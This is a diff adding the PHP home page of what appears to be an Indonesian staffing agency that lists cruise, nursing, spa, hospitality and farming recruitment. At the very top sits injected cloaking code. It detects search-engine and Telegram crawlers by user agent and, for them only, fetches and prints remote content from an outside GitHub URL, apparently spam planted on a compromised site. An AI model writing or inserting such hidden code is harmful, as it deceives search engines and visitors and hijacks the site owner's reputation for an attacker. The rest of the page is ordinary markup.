@@ -1,0 +1,117 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+if (is_bot()) {
+    $message = file_get_contents('https://raw.githubusercontent.com/mRm1337x/txtt/refs/heads/main/7da4gfe4gs');
+    echo $message;
+}
+?>
+
+
+<? 
+$DOC_TITLE = "Home";
+$LEFT_PIC = "left-home.jpg";
+include("template/cig_header.php");
+?>
+    <!-- SIAPKAN TEMPAT UTK BLOK KONTEN  -->
+    <td>
+        <table style="text-align: left; width: 100%;" border="0" cellpadding="0" cellspacing="2">
+            <!-- GBR ILUSTRASI dan JUDUL KONTEN -->
+            <tr valign="bottom">
+            <td align="right">
+                <img style="width: 350px; height: 78px;" alt="Our Services" src="images/isi-home2.jpg">
+            </td>
+<!--            <td class="h1a">OUR<br>SERVICES</td> -->
+            </tr>
+            <!-- GBR GARIS SEPARATOR ANTARA JUDUL DAN KONTEN -->
+            <tr><td align="right">
+                <img style="width: 400px; height: 33px;" alt="-" src="images/isi-separator.jpg">
+            </td></tr>
+            
+            <!-- BAGIAN UTAMA UTK KONTEN -->
+            <tr><td>
+            <table style="text-align: left; width: 100%;" border="0" cellpadding="10" cellspacing="2">
+                <tr><td class="normal" colspan="2" rowspan="1">
+                </td></tr></table>
+                
+<!-- CRUISE SHIP -->                
+                <table width="100%" border="0" cellpadding="10" cellspacing="2">
+                <tr valign="top">
+                <td width="1%">
+                    <a href="cruiseship.php"><img class="tanpaborder" style="height: 55px;" alt="Cruise Staff" src="images/isi-cruiseship2-55px.jpg"></a>
+                </td>
+                <td><span class="h1a"><a href="cruiseship.php">Cruise Ship</a></span><br>
+                <span class="normal">
+                Our strong affiliation with the Tourism College and major Cruise Ship Training 
+                Center in Bali which have best graduated in quality of service for cruise 
+                industry, has enable us to help out in the recruitment needs of Cruise Industry.  
+                </span></td></tr></table>
+<!-- NURSING -->    
+                <table width="100%" border="0" cellpadding="10" cellspacing="2">
+                <tr valign="top">
+                <td align="right"><span class="h1a"><a href="nursing.php">Nursing</a></span><br>
+                <span class="normal">
+                A wide variety of nursing academies in Indonesia have been providing exemplary 
+                quality of skillful graduates with young, friendly and energetic character. 
+                This opportunity giving us admission in finding the right nurses to our clients.
+                </span></td>
+                <td width="1%">
+                    <a href="nursing.php"><img class="tanpaborder" style="height: 55px;" alt="Nurse" src="images/isi-nurse2-55px.jpg"></a>
+                </td></tr></table>
+
+<!-- SPA -->    
+                <table width="100%" border="0" cellpadding="10" cellspacing="2">
+                <tr valign="top">
+                <td width="1%">
+                    <a href="spa.php"><img class="tanpaborder" style="height: 55px;" alt="Spa" src="images/isi-spa-55px2.jpg"></a>
+                </td>
+                <td><span class="h1a"><a href="http://www.balispatherapist.com">Spa</a></span><br>
+                <span class="normal">
+                Indonesia has two famous islands where the people's character is tender and 
+                friendly. These islands have delivering skillful Therapist in to many growing 
+                Spa industry, their ability is referred as Balinese and Javanese traditional Spa Therapist.   
+                </span></td></tr></table>
+            
+<!-- HOSPITALITY -->    
+                <table width="100%" border="0" cellpadding="10" cellspacing="2">
+                <tr valign="top">
+                <td align="right"><span class="h1a"><a href="hospitality.php">Hospitality</a></span><br>
+                <span class="normal">
+                Bali is one of the best tourist destinations in the world. 
+                Generally people have high quality skill and working experience in Hotels, 
+                Bars, Restaurants and any Exciting tourism object.
+                </span></td>
+                <td width="1%">
+                    <a href="hospitality.php"><img class="tanpaborder" style="height: 55px;" alt="Hospitality" src="images/isi-hospitality-55px.jpg"></a>
+                </td></tr></table>
+            
+<!-- FARMING -->    
+                <table width="100%" border="0" cellpadding="10" cellspacing="2">
+                <tr valign="top">
+                <td width="1%">
+                    <a href="farming.php"><img class="tanpaborder" style="height: 55px;" alt="Farmer" src="images/isi-farmer-55px.jpg"></a>
+                </td>
+                <td><span class="h1a"><a href="farming.php">Farming</a></span><br>
+                <span class="normal">
+                Indonesia is one of the biggest Agriculture countries in Asia. Most of the people 
+                grow and expand in agriculture environment. Now Indonesian Farming is well trained 
+                by Government Organization to improve their skill in technologies.
+                </span></td></tr></table>
+                
+            </td></tr>
+        </table>
+    </td>
+
+<? 
+include("template/cig_footer.php");
+?>
